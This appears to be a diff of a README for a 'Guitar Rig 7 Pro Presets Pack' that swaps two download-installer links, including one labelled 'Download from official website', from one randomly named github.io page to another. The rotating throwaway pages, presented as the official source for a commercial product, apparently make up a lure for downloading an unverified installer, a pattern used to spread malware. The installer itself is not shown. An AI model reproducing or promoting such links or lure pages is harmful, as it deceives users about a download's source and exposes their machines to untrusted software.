@@ -2,7 +2,7 @@
 
 The Guitar Rig 7 Pro Presets Pack is a comprehensive collection designed for musicians and producers who demand high-quality, versatile tones for their projects. This pack integrates seamlessly with Guitar Rig 7, offering an extensive library of presets that cover a wide range of musical styles from classic rock to modern metal, blues, jazz, and ambient soundscapes. Whether you're a beginner or a seasoned professional, these presets provide a solid foundation for crafting unique sounds without the need for extensive tweaking.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -59,6 +59,6 @@ A: We offer a satisfaction guarantee within 30 days of purchase. If you encounte
 
 To get started with the Guitar Rig 7 Pro Presets Pack, download the installer from the official website:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides access to the latest version of the presets pack, including all recent updates and additions. Ensure you have a stable internet connection for a smooth download experience.
